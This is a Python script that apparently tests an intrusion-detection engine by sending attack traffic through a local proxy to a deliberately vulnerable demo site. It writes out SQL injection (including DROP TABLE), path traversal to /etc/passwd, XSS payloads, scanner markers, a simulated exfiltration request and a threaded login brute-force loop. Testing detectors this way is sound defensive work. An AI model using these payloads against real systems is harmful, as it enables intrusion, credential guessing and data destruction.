import requests
import concurrent.futures
import time

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

TARGET = "http://testphp.vulnweb.com"

print(f"🚀 Launching COMPREHENSIVE Attacks through MITM Proxy (127.0.0.1:8080)")
print("This will trigger every classification rule in the hybrid engine.\n" + "-"*50)

payloads = [
    # 1. SQL Injections (SQLi)
    ("GET", "/listproducts.php?cat=1' OR '1'='1", None),
    ("GET", "/listproducts.php?cat=1; DROP TABLE users", None),
    # 2. Path Traversals / LFI
    ("GET", "/showimage.php?file=../../../../etc/passwd", None),
    ("GET", "/showimage.php?file=../../../../Windows/win.ini", None),
    # 3. Cross-Site Scripting (XSS)
    ("GET", "/search.php?test=%3Cscript%3Ealert(%27xss%27)%3C%2Fscript%3E", None),
    ("GET", "/guestbook.php?name=<img src=x onerror=prompt(1)>", None),
    # 4. Automated Vulnerability Scanners
    ("GET", "/?nikto=test", None),
    ("GET", "/?scanner=sqlmap", None),
]

print("[*] Firing Signatures (SQLi, Path Traversal, XSS, Scanners)...")
for method, path, data in payloads:
    try:
        requests.get(TARGET + path, proxies=proxies, timeout=3)
        time.sleep(0.5)
    except:
        pass

# 5. Data Exfiltration Anomaly (Large Outbound Request Size)
print("[*] Simulating Data Exfiltration (Massive Outbound Payload)...")
try:
    huge_payload = "A" * 5000
    requests.post(TARGET + "/search.php", data={"query": huge_payload}, proxies=proxies, timeout=3)
except:
    pass
time.sleep(1)

# 6. Brute Force (High frequency POST to /login or /userinfo)
print("[*] Initiating High-Velocity Brute Force on /login.php...")
def brute_force(attempt):
    try:
        requests.post(
            TARGET + "/userinfo.php", 
            data={"uname": "admin", "pass": f"password{attempt}"}, 
            proxies=proxies, 
            timeout=3
        )
    except:
        pass

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(brute_force, i) for i in range(15)]
    concurrent.futures.wait(futures)

print("-" * 50 + "\n✅ All Comprehensive attacks dispatched!")
